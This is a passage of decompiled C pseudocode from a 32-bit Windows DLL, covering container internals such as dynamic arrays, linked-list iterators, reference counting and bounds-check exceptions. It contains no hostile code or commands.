  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6BFF);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 12 * a2;
    do
    {
      sub_10024D28(this[3] + v5 + 12, this[3] + v5);
      ++v4;
      v5 += 12;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10024D28((int)&unk_100BFA94, this[3] + 12 * v6);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10025D4C) --------------------------------------------------------
int __thiscall sub_10025D4C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6C09);
  return this[3] + 12 * a2;
}

//----- (10025D6D) --------------------------------------------------------
int __thiscall sub_10025D6D(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B6C0A);
  return this[3] + 12 * a2;
}

//----- (10025D8E) --------------------------------------------------------
void __thiscall sub_10025D8E(_DWORD *this, unsigned int a2)
{
  void (__thiscall ***v2)(_DWORD, int); // esi

  if ( this[2] < a2 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void (__thiscall ***)(_DWORD, int), unsigned int))(*this + 84))(
      this,
      this[1],
      v2,
      a2);
    if ( v2 )
    {
      if ( *(v2 - 1) )
        (**v2)(v2, 3);
      else
        j__free(v2 - 1);
    }
  }
}

//----- (10025DC9) --------------------------------------------------------
int __thiscall sub_10025DC9(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // edx
  int result; // eax

  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10025E02) --------------------------------------------------------
BOOL __thiscall sub_10025E02(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10025E0D) --------------------------------------------------------
int __thiscall sub_10025E0D(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // edi
  int v5; // eax

  v2 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 12 * a2;
    do
    {
      sub_10024D28((int)&unk_100BFA94, v4 + this[3]);
      ++a2;
      v4 += 12;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v5 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (10025E64) --------------------------------------------------------
unsigned int __thiscall sub_10025E64(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B6C0B);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (10025EE0) --------------------------------------------------------
unsigned int __thiscall sub_10025EE0(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10025F08) --------------------------------------------------------
unsigned int __stdcall sub_10025F08(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10025F1B) --------------------------------------------------------
unsigned int __thiscall sub_10025F1B(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax
  int v12; // edi

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (12 * (unsigned __int64)(unsigned int)v5) >> 32 != 0 ? -1 : 12 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0xCu,
      v5,
      (void (__thiscall *)(void *))sub_10024AE4,
      (void (__thiscall *)(void *))sub_10024B5F);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v12 = 0;
    do
    {
      sub_10024D28(v12 + a3, v12 + this[3]);
      ++v10;
      v12 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10025FC1) --------------------------------------------------------
void __thiscall sub_10025FC1(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  char *v6; // ebx
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  int v10; // edi
  char *i; // eax
  unsigned int v12; // [esp+14h] [ebp-18h]
  int v13; // [esp+18h] [ebp-14h]
  int v14; // [esp+1Ch] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v13 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (char *)this[3];
    v7 = (12 * (unsigned __int64)(unsigned int)v13) >> 32 != 0 ? -1 : 12 * v13;
    v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
    if ( v8 )
    {
      v9 = v8 + 1;
      *v8 = v13;
      `eh vector constructor iterator'(
        v8 + 1,
        0xCu,
        v13,
        (void (__thiscall *)(void *))sub_10024AE4,
        (void (__thiscall *)(void *))sub_10024B5F);
      v14 = (int)v9;
    }
    else
    {
      v14 = 0;
    }
    v12 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v10 = v14;
      for ( i = &v6[-v14]; ; i = &v6[-v14] )
      {
        sub_10024D28((int)&i[v10], v10);
        ++v12;
        v10 += 12;
        if ( v12 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v14;
    if ( v6 )
    {
      if ( *((_DWORD *)v6 - 1) )
        (**(void (__thiscall ***)(char *, int))v6)(v6, 3);
      else
        j__free(v6 - 4);
    }
    this[2] = v13;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (100260EA) --------------------------------------------------------
_DWORD *__userpurge sub_100260EA@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10026129) --------------------------------------------------------
void __thiscall sub_10026129(void *this)
{
  sub_100262ED((int)this);
}

//----- (1002616E) --------------------------------------------------------
_DWORD *__userpurge sub_1002616E@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100261AD) --------------------------------------------------------
void __thiscall sub_100261AD(void *this)
{
  sub_10026327((int)this);
}

//----- (100261DE) --------------------------------------------------------
_DWORD *__thiscall sub_100261DE(_DWORD *Block, char a2)
{
  sub_10025BE9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100261FD) --------------------------------------------------------
char *__thiscall sub_100261FD(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0xCu, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_10024B5F);
    if ( (a2 & 1) != 0 )
      j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_10024B5F(Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (10026247) --------------------------------------------------------
_DWORD *__stdcall sub_10026247(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10094844;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094844: using guessed type int (__thiscall *off_10094844)(void *Block, char);

//----- (10026272) --------------------------------------------------------
void __usercall sub_10026272(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0xC4u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(
      v2 + 1,
      0xCu,
      16,
      (void (__thiscall *)(void *))sub_10024AE4,
      (void (__thiscall *)(void *))sub_10024B5F);
  }
  a1[3] = v1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (100262ED) --------------------------------------------------------
void __usercall sub_100262ED(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10026327) --------------------------------------------------------
void __usercall sub_10026327(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10026363) --------------------------------------------------------
_DWORD *__stdcall sub_10026363(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax

  sub_1002271D(a1, 0, 0);
  *a1 = &off_10093810;
  v1 = operator new(0x40u);
  if ( v1 )
    v2 = sub_100264D8(v1, -1);
  else
    v2 = 0;
  sub_100271EB(a1 + 3, (int)v2);
  a1[5] = -1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093810: using guessed type int (__thiscall *off_10093810)(void *Block, char);

//----- (100263C8) --------------------------------------------------------
_DWORD *__stdcall sub_100263C8(_DWORD *a1, int a2, void *a3, void *Block)
{
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD *Blocka; // [esp+30h] [ebp+14h]

  sub_1002271D(a1, a3, (char)Block);
  *a1 = &off_10093810;
  Blocka = operator new(0x40u);
  if ( Blocka )
  {
    v4 = sub_1001A85E(a1);
    v5 = sub_100264D8(Blocka, v4);
  }
  else
  {
    v5 = 0;
  }
  sub_100271EB(a1 + 3, (int)v5);
  a1[5] = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093810: using guessed type int (__thiscall *off_10093810)(void *Block, char);

//----- (10026439) --------------------------------------------------------
_DWORD *__userpurge sub_10026439@<eax>(int a1@<edi>, _DWORD *a2)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *Block; // [esp+10h] [ebp-10h]

  sub_1000FF31(a1, a2);
  *a2 = &off_10093810;
  Block = operator new(0x40u);
  if ( Block )
  {
    v2 = sub_1001A85E(a2);
    v3 = sub_100264D8(Block, v2);
  }
  else
  {
    v3 = 0;
  }
  sub_100271EB(a2 + 3, (int)v3);
  a2[5] = 128;
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093810: using guessed type int (__thiscall *off_10093810)(void *Block, char);

//----- (100264A5) --------------------------------------------------------
LONG __thiscall sub_100264A5(int *this)
{
  *this = (int)&off_10093810;
  sub_1000FFF2(this + 3);
  return sub_10001FCC(this);
}
// 10093810: using guessed type int (__thiscall *off_10093810)(void *Block, char);

//----- (100264D8) --------------------------------------------------------
_DWORD *__stdcall sub_100264D8(_DWORD *a1, int a2)
{
  a1[2] = 0;
  a1[1] = a2;
  *a1 = off_100948FC;
  sub_10026745(a1 + 3);
  sub_10017224((int)(a1 + 7));
  return a1;
}
// 100948FC: using guessed type int (__thiscall *off_100948FC[2])(void *Block, char);

//----- (1002651B) --------------------------------------------------------
int *__thiscall sub_1002651B(int *Block, char a2)
{
  sub_1002653A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002653A) --------------------------------------------------------
void __thiscall sub_1002653A(int *this)
{
  *this = (int)off_100948FC;
  while ( this[2] )
    sub_1002667B(this);
  sub_100172B1(this + 7);
  sub_1002677C(this + 3);
}
// 100948FC: using guessed type int (__thiscall *off_100948FC[2])(void *Block, char);

//----- (1002659B) --------------------------------------------------------
int __stdcall sub_1002659B(_DWORD *a1)
{
  int v1; // eax
  void *v3[22]; // [esp+10h] [ebp-B4h] BYREF
  char v4; // [esp+68h] [ebp-5Ch]
  int v5[3]; // [esp+9Ch] [ebp-28h] BYREF
  _DWORD v6[3]; // [esp+A8h] [ebp-1Ch] BYREF
  int v7; // [esp+C0h] [ebp-4h]

  sub_100171BE(a1 + 7, v6);
  v7 = 0;
  v1 = a1[2];
  if ( v1 )
  {
    a1[2] = v1 + 1;
  }
  else
  {
    a1[2] = 1;
    sub_10033D1B((int)v3, a1[1]);
    LOBYTE(v7) = 2;
    while ( !v4 )
    {
      sub_100341CD(v3, v5);
      LOBYTE(v7) = 3;
      sub_1000EC2C(v5);
      (*(void (__thiscall **)(_DWORD *, int *))(a1[3] + 36))(a1 + 3, v5);
      sub_10033FF6((unsigned int *)v3);
      LOBYTE(v7) = 2;
      sub_1000EA34(v5);
    }
    v7 = 0;
    sub_10033F75((int *)v3);
  }
  v7 = -1;
  return sub_100171F2(v6);
}
// 1002659B: using guessed type _DWORD var_1C[3];
// 1002659B: using guessed type int var_28[3];

//----- (1002667B) --------------------------------------------------------
int __usercall sub_1002667B@<eax>(_DWORD *a1@<esi>)
{
  unsigned int v1; // eax
  int v2; // eax
  _DWORD v4[2]; // [esp+Ch] [ebp-20h] BYREF
  _DWORD v5[3]; // [esp+14h] [ebp-18h] BYREF
  int v6; // [esp+28h] [ebp-4h]

  sub_100171BE(a1 + 7, v5);
  v6 = 0;
  v1 = a1[2];
  if ( v1 <= 1 )
  {
    a1[2] = v1 - 1;
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(a1[3] + 12))(a1 + 3, v4);
    LOBYTE(v6) = 1;
    while ( !(*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)v4[0] + 4))(v4[0]) )
    {
      v2 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v4[0] + 12))(v4[0]);
      (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 32))(v2);
      (*(void (__thiscall **)(_DWORD))(*(_DWORD *)v4[0] + 24))(v4[0]);
    }
    LOBYTE(v6) = 0;
    sub_10027280(v4);
  }
  else
  {
    a1[2] = v1 - 1;
  }
  v6 = -1;
  return sub_100171F2(v5);
}
// 1002667B: using guessed type _DWORD var_18[3];

//----- (10026745) --------------------------------------------------------
_DWORD *__stdcall sub_10026745(_DWORD *a1)
{
  sub_10026CDF(a1);
  *a1 = &off_10094900;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 10094900: using guessed type int (__thiscall *off_10094900)(void *Block, char);

//----- (1002677C) --------------------------------------------------------
void __thiscall sub_1002677C(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi

  *this = &off_10094900;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[3];
    sub_10026BE9(i);
  }
  sub_10026959(this);
}
// 10094900: using guessed type int (__thiscall *off_10094900)(void *Block, char);

//----- (100267D3) --------------------------------------------------------
void *__thiscall sub_100267D3(void *this, int a2)
{
  sub_10026C83(a2, (int)this);
  return this;
}

//----- (100267E8) --------------------------------------------------------
void *__thiscall sub_100267E8(void *this, int a2)
{
  sub_10026C83(a2, (int)this);
  return this;
}

//----- (100267FD) --------------------------------------------------------
int __thiscall sub_100267FD(_DWORD *this)
{
  return this[3];
}

//----- (10026801) --------------------------------------------------------
_DWORD *__thiscall sub_10026801(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10026D7B(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10027241(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10026857) --------------------------------------------------------
_DWORD *__thiscall sub_10026857(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10026F65(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_100272C5(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100268AD) --------------------------------------------------------
_DWORD *__thiscall sub_100268AD(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10026D7B(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10027241(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10026903) --------------------------------------------------------
_DWORD *__thiscall sub_10026903(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10026F65(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_100272C5(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10026959) --------------------------------------------------------
void __thiscall sub_10026959(_DWORD *this)
{
  *this = &off_10094940;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094940: using guessed type int (__thiscall *off_10094940)(void *Block, char);

//----- (1002697E) --------------------------------------------------------
int *__thiscall sub_1002697E(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10026D0A(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100269D4: variable 'v5' is possibly undefined

//----- (100269E6) --------------------------------------------------------
int *__thiscall sub_100269E6(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10026D4A(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10026A3C: variable 'v5' is possibly undefined

//----- (10026A4E) --------------------------------------------------------
void __thiscall sub_10026A4E(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10027280(v2);
}

//----- (10026A86) --------------------------------------------------------
void __thiscall sub_10026A86(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10027280(v3);
}

//----- (10026AC1) --------------------------------------------------------
void __thiscall sub_10026AC1(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10027280(v2);
}

//----- (10026AF9) --------------------------------------------------------
int __thiscall sub_10026AF9(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10027304(v4);
  return v2;
}

//----- (10026B35) --------------------------------------------------------
int __thiscall sub_10026B35(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10027280(v4);
  return v2;
}

//----- (10026B71) --------------------------------------------------------
void __thiscall sub_10026B71(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10027280(v1);
}

//----- (10026BCA) --------------------------------------------------------
_DWORD *__thiscall sub_10026BCA(_DWORD *Block, char a2)
{
  sub_1002677C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10026BE9) --------------------------------------------------------
int *__stdcall sub_10026BE9(int *Block)
{
  sub_10026C63(Block);
  j__free(Block);
  return Block;
}

//----- (10026C04) --------------------------------------------------------
_DWORD *__thiscall sub_10026C04(_DWORD *Block, char a2)
{
  sub_10026959(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10026C23) --------------------------------------------------------
_DWORD *__thiscall sub_10026C23(_DWORD *Block, char a2)
{
  *Block = &off_10094978;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094978: using guessed type int (__thiscall *off_10094978)(void *Block, char);

//----- (10026C43) --------------------------------------------------------
_DWORD *__thiscall sub_10026C43(_DWORD *Block, char a2)
{
  *Block = &off_10094998;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094998: using guessed type int (__thiscall *off_10094998)(void *Block, char);

//----- (10026C63) --------------------------------------------------------
LONG __stdcall sub_10026C63(int *a1)
{
  return sub_1000EA34(a1);
}

//----- (10026C83) --------------------------------------------------------
void __usercall sub_10026C83(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_10026D4A(v4, v5[0]);
  }
  v6 = -1;
  sub_10027304(v5);
}
// 10026CBC: variable 'v4' is possibly undefined

//----- (10026CDF) --------------------------------------------------------
_DWORD *__stdcall sub_10026CDF(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10094940;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094940: using guessed type int (__thiscall *off_10094940)(void *Block, char);

//----- (10026D0A) --------------------------------------------------------
int __usercall sub_10026D0A@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10026D4A) --------------------------------------------------------
int __usercall sub_10026D4A@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10026D7B) --------------------------------------------------------
_DWORD *__thiscall sub_10026D7B(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094978;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_100949B8;
  a2[3] = a3;
  return result;
}
// 10094978: using guessed type int (__thiscall *off_10094978)(void *Block, char);
// 100949B8: using guessed type int (__thiscall *off_100949B8)(void *Block, char);

//----- (10026DB5) --------------------------------------------------------
void __thiscall sub_10026DB5(_DWORD *this)
{
  *this = &off_100949B8;
  *this = &off_10094978;
}
// 10094978: using guessed type int (__thiscall *off_10094978)(void *Block, char);
// 100949B8: using guessed type int (__thiscall *off_100949B8)(void *Block, char);

//----- (10026DDA) --------------------------------------------------------
BOOL __thiscall sub_10026DDA(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10026DE3) --------------------------------------------------------
BOOL __thiscall sub_10026DE3(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10026DEC) --------------------------------------------------------
int __thiscall sub_10026DEC(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10026E10) --------------------------------------------------------
